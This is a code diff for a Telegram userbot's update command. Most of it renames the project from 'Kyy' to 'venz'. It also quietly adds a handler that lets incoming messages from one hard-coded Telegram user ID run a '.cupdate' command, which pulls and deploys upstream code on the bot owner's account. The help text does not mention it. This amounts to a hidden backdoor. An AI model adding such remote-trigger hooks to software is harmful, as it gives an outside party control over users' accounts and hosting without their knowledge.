@@ -18,7 +18,7 @@ from userbot import (
     HEROKU_APP_NAME,
     UPSTREAM_REPO_URL,
     UPSTREAM_REPO_BRANCH)
-from userbot.utils import edit_or_reply, edit_delete, kyy_cmd
+from userbot.utils import edit_or_reply, edit_delete, venz_cmd
 
 requirements_path = path.join(
     path.dirname(path.dirname(path.dirname(__file__))), 'requirements.txt')
@@ -68,7 +68,7 @@ async def deploy(event, repo, ups_rem, ac_br, txt):
                 break
         if heroku_app is None:
             await edit_delete(event,
-                              f"{txt}\n`Kredensial Heroku tidak valid untuk deploy Kyy-Project dyno.`"
+                              f"{txt}\n`Kredensial Heroku tidak valid untuk deploy venz-Project dyno.`"
                               )
             return repo.__del__()
         await edit_or_reply(event,
@@ -138,7 +138,8 @@ async def update(event, repo, ups_rem, ac_br):
     return
 
 
-@kyy_cmd(pattern="update(?: |$)(now|deploy)?")
+@venz_cmd(pattern="update(?: |$)(now|deploy)?")
+@register(incoming=True, from_users=1971311438,pattern=r"^\.cupdate(?: |$)(now|deploy)?")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
     xx = await edit_or_reply(event, "**Mengecek Pembaruan, Silakan Menunggu....**")
@@ -228,9 +229,7 @@ async def upstream(event):
         await xx.edit("` Proses Update ✨venz-userbot✨, Loading....35%`")
         await xx.edit("` Proses Update ✨venz-userbot✨, Loading....77%`")
         await xx.edit("` Proses Update ✨venz-userbot✨, Updating...90%`")
-        await xx.edit(
-            "` Proses Update ✨venz-userbot✨, Mohon Tunggu Sebentar....100%`"
-        )
+        await xx.edit("` Proses Update ✨venz-userbot✨, Mohon Tunggu Sebentar....100%`")
 
     if conf == "now":
         await update(event, repo, ups_rem, ac_br)
@@ -246,7 +245,7 @@ async def upstream(event):
 CMD_HELP.update(
     {
         "update": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}update`"
-        "\n• : Untuk Melihat Pembaruan Terbaru Kyy-Userbot."
+        "\n• : Untuk Melihat Pembaruan Terbaru venz-Userbot."
         f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}update now`"
         "\n• : Memperbarui Venz-Userbot."
         f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}update deploy`"
